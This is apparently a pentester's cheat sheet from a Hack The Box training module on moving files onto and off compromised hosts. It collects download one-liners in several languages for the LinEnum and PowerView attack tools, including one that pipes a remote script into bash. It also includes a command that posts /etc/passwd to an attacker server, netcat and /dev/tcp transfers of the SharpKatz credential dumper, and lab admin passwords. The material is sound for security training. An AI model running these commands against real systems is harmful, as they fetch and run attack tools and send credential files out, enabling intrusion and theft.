
## Download
#### Python
```shell
h@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

```shell
h@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
#python

#### PHP
```shell
h@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

```shell
h@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

```shell
h@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```
#php

#### Ruby
```shell
h@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

```shell
h@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```
[[ruby]]

#### JS [[js]]
Create wget.js:
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```
Run:
```powershell
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```
[[powershell]]

#### VB [[vbscript]]
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```cmd-session
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## Upload
```shell
python3 -m uploadserver 
```

```shell
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

## Misc

[[ncat]] [[nc]] 
Recieve
```shell-session
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

```shell
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

```shell
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

```shell
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

Send
```shell
jabrach@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

```shell
jabrach@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

```shell
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

```shell
jabrach@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

```shell
jabrach@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### PowerShell Session File Transfer
[[powershell]]
```powershell
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

```powershell
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

```powershell
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

```powershell
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

#### RDP
[[RDP]]
```shell
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

```shell
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

